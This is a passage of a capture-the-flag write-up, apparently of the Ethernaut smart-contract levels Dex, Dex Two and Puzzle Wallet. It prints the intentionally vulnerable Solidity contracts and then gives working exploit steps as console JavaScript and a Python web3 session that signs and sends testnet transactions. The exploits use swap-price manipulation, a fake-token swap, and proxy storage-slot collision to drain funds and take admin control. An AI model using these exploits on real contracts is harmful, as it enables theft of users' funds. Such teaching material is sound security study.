function_">balanceOf</span>(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SwappableToken</span> is <span class="title class_">ERC20</span> &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address dexInstance, string memory name, string memory symbol, uint256 initialSupply</span>) <span class="title class_">ERC20</span>(name, symbol) &#123;</span><br><span class="line">        <span class="title function_">_mint</span>(msg.<span class="property">sender</span>, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address owner, address spender, uint256 amount</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(owner != _dex, <span class="string">&quot;InvalidApprover&quot;</span>);</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">_approve</span>(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge, we must drain at least one type of token from the two available tokens from the contract. Since the <strong>swap price is dependent on the balance of 2 tokens</strong> we can <strong>swap a token which has less balance to get more tokens</strong> for <strong>low price</strong>. Doing this repeatedly, we can drain out all <code>110 tokens</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-&gt; swap 1 request: tkn2; a:0,b:20</span><br><span class="line">-&gt; swap 1 request: tkn1; a:24,b:0</span><br><span class="line">-&gt; swap 1 request: tkn2; a:0,b:30</span><br><span class="line">-&gt; swap 1 request: tkn1; a:41,b:0</span><br><span class="line">-&gt; swap 1 request: tkn2; a:0,b:65</span><br><span class="line">-&gt; swap 1 request: tkn1; a:110,b:20</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(instance, <span class="number">110</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(<span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="number">10</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(<span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="number">20</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(<span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="number">24</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(<span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="number">30</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(<span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="number">41</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(<span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="number">45</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> contract.<span class="title function_">token1</span>(), player) <span class="comment">// -&gt; 110</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> contract.<span class="title function_">token2</span>(), player) <span class="comment">// -&gt; 20</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="23-Dex-Two"><a href="#23-Dex-Two" class="headerlink" title="23 - Dex Two"></a>23 - Dex Two</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DexTwo</span> is <span class="title class_">Ownable</span> &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setTokens</span>(<span class="params">address _token1, address _token2</span>) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">add_liquidity</span>(<span class="params">address token_address, uint amount</span>) public onlyOwner &#123;</span><br><span class="line">    <span class="title class_">IERC20</span>(token_address).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">swap</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">balanceOf</span>(msg.<span class="property">sender</span>) &gt;= amount, <span class="string">&quot;Not enough to swap&quot;</span>);</span><br><span class="line">    uint swapAmount = <span class="title function_">getSwapAmount</span>(<span class="keyword">from</span>, to, amount);</span><br><span class="line">    <span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">    <span class="title class_">IERC20</span>(to).<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), swapAmount);</span><br><span class="line">    <span class="title class_">IERC20</span>(to).<span class="title function_">transferFrom</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), msg.<span class="property">sender</span>, swapAmount);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getSwapAmount</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) public view <span class="title function_">returns</span>(<span class="params">uint</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>((amount * <span class="title class_">IERC20</span>(to).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)))/<span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint amount</span>) public &#123;</span><br><span class="line">    <span class="title class_">SwappableTokenTwo</span>(token1).<span class="title function_">approve</span>(msg.<span class="property">sender</span>, spender, amount);</span><br><span class="line">    <span class="title class_">SwappableTokenTwo</span>(token2).<span class="title function_">approve</span>(msg.<span class="property">sender</span>, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address token, address account</span>) public view returns (uint)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">IERC20</span>(token).<span class="title function_">balanceOf</span>(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SwappableTokenTwo</span> is <span class="title class_">ERC20</span> &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address dexInstance, string memory name, string memory symbol, uint initialSupply</span>) <span class="title class_">ERC20</span>(name, symbol) &#123;</span><br><span class="line">        <span class="title function_">_mint</span>(msg.<span class="property">sender</span>, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address owner, address spender, uint256 amount</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(owner != _dex, <span class="string">&quot;InvalidApprover&quot;</span>);</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">_approve</span>(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This is the same <code>dex</code> challenge without a check inside the <code>swap</code> function that allows us to swap any token instead of being limited to only two tokens, <strong>this allows us to control the swap price to whatever we want</strong>. Sending only one token of our own to the challenge contract can give us all the tokens. So first, I created a token with <strong>4</strong> as <code>totalSupply</code>, approved them for my address and the instance address, and sent one token to the contract. Now the swap price for the <strong>swap from my own_token to token1</strong> will be <code>100/1 * 1</code>, which is <code>100</code> and <strong>I get 100 of token1 for just one token of my</strong>, similarly for the second swap the swap price will be <code>100/2 * 2</code> which is also <code>100,</code> and I get all the tokens.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> token_own = <span class="string">&quot;0x07e491A192F73AF5e584A89a86A99F97a48bE6c9&quot;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(instance,<span class="number">110</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token_own, <span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="number">1</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token_own, <span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="number">2</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> contract.<span class="title function_">token1</span>(), player) <span class="comment">// -&gt; 110</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> contract.<span class="title function_">token2</span>(), player) <span class="comment">// -&gt; 20</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="24-Puzzle-Wallet"><a href="#24-Puzzle-Wallet" class="headerlink" title="24 - Puzzle Wallet"></a>24 - Puzzle Wallet</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">pragma experimental <span class="title class_">ABIEncoderV</span>2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../helpers/UpgradeableProxy-08.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">PuzzleProxy</span> is <span class="title class_">UpgradeableProxy</span> &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _admin, address _implementation, bytes memory _initData</span>) <span class="title class_">UpgradeableProxy</span>(_implementation, _initData) &#123;</span><br><span class="line">        admin = _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin &#123;</span><br><span class="line">      <span class="built_in">require</span>(msg.<span class="property">sender</span> == admin, <span class="string">&quot;Caller is not the admin&quot;</span>);</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">proposeNewAdmin</span>(<span class="params">address _newAdmin</span>) external &#123;</span><br><span class="line">        pendingAdmin = _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approveNewAdmin</span>(<span class="params">address _expectedAdmin</span>) external onlyAdmin &#123;</span><br><span class="line">        <span class="built_in">require</span>(pendingAdmin == _expectedAdmin, <span class="string">&quot;Expected new admin by the current admin is not the pending admin&quot;</span>);</span><br><span class="line">        admin = pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">upgradeTo</span>(<span class="params">address _newImplementation</span>) external onlyAdmin &#123;</span><br><span class="line">        <span class="title function_">_upgradeTo</span>(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">PuzzleWallet</span> &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> bool) public whitelisted;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balances;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params">uint256 _maxBalance</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(maxBalance == <span class="number">0</span>, <span class="string">&quot;Already initialized&quot;</span>);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted &#123;</span><br><span class="line">        <span class="built_in">require</span>(whitelisted[msg.<span class="property">sender</span>], <span class="string">&quot;Not whitelisted&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setMaxBalance</span>(<span class="params">uint256 _maxBalance</span>) external onlyWhitelisted &#123;</span><br><span class="line">      <span class="built_in">require</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>, <span class="string">&quot;Contract balance is not 0&quot;</span>);</span><br><span class="line">      maxBalance = _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">addToWhitelist</span>(<span class="params">address addr</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner, <span class="string">&quot;Not the owner&quot;</span>);</span><br><span class="line">        whitelisted[addr] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params"></span>) external payable onlyWhitelisted &#123;</span><br><span class="line">      <span class="built_in">require</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> &lt;= maxBalance, <span class="string">&quot;Max balance reached&quot;</span>);</span><br><span class="line">      balances[msg.<span class="property">sender</span>] += msg.<span class="property">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params">address to, uint256 value, bytes calldata data</span>) external payable onlyWhitelisted &#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.<span class="property">sender</span>] &gt;= value, <span class="string">&quot;Insufficient balance&quot;</span>);</span><br><span class="line">        balances[msg.<span class="property">sender</span>] -= value;</span><br><span class="line">        (bool success, ) = to.<span class="property">call</span>&#123; <span class="attr">value</span>: value &#125;(data);</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">&quot;Execution failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">multicall</span>(<span class="params">bytes[] calldata data</span>) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := <span class="title function_">mload</span>(<span class="title function_">add</span>(_data, <span class="number">32</span>))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (selector == <span class="variable language_">this</span>.<span class="property">deposit</span>.<span class="property">selector</span>) &#123;</span><br><span class="line">                <span class="built_in">require</span>(!depositCalled, <span class="string">&quot;Deposit can only be called once&quot;</span>);</span><br><span class="line">                <span class="comment">// Protect against reusing msg.value</span></span><br><span class="line">                depositCalled = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success, ) = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="title function_">delegatecall</span>(data[i]);</span><br><span class="line">            <span class="built_in">require</span>(success, <span class="string">&quot;Error while delegating call&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This contract uses an upgradable proxy, so they can change the logic of the contract if needed. This wallet contract has <code>multicall</code> functionality, which checks if we are making multiple donations in the same call. Looking at that made me suspicious since the <code>msg.value</code> does not change. Calling the deposit function increases the funds multiple times of <code>msg.value</code> without sending them to the wallet multiple times, so if we can increase our funds without actually paying them, we can withdraw all the contract funds. However, the contract checks if we call the <code>deposit</code> function multiple times. However, if we made a <code>multicall</code> to recure itself, it is possible to call <code>deposite</code> multiple times since the function checks the <code>depositCalled</code> bool. It is inside the <code>multicall</code> function. Calling a <code>multicall</code> inside a <code>multicall</code>, the <code>depositCalled</code> bool will be reset to false. However, we cannot do all this without becoming <code>whitelisted</code>, and we cannot be <code>whitelisted</code> unless we become the <code>owner</code> of this contract. This can be achieved because the proxy contract has an address variable named <code>pendingAdmin</code> located at the same slot as the <code>owner</code> variable in the logic contract since the proxy uses the <code>delegatecall</code> if it becomes the <code>pendingAdmin</code> of the proxy contract. We become the <code>owner</code> of the logic contract allowing us to become <code>whitelisted</code> and drain the funds. However, our goal is to claim ownership of the proxy contract. To achieve that, we can set <code>maxBalance</code> to our address similarly to <code>pendingAdmin</code>, and <code>owner</code>, <code>maxBalance</code>, and <code>Admin</code> are in the same slot, and changing the <code>maxBalance</code> to our address changes the <code>Admin</code> in the proxy contract.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">In [<span class="number">547</span>]: proposeadmin_selector = io.soliditySha3(abi_types=[<span class="string">&#x27;string&#x27;</span>],values=[<span class="string">&#x27;proposeNewAdmin(address)&#x27;</span>])[:<span class="number">4</span>].<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">In [<span class="number">548</span>]: proposeadmin_selector</span><br><span class="line">Out[<span class="number">548</span>]: <span class="string">&#x27;0xa6376746&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">549</span>]: calldata = proposeadmin_selector + pub[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">550</span>]: calldata</span><br><span class="line">Out[<span class="number">550</span>]: <span class="string">&#x27;0xa637674600000000000000000000000025Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">551</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line">t</span><br><span class="line">In [<span class="number">552</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">553</span>]: tx</span><br><span class="line">Out[<span class="number">553</span>]:</span><br><span class="line">&#123;<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0xa637674600000000000000000000000025Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>,</span><br><span class="line"> <span class="string">&#x27;nonce&#x27;</span>: <span class="number">338</span>,</span><br><span class="line"> <span class="string">&#x27;gasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;gas&#x27;</span>: <span class="number">26158</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">554</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">555</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">556</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">556</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xe5e93b3acaeb9470e03fa62e389a9c3786272bbd2d6ce555d159c9ea5a248cfc&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span 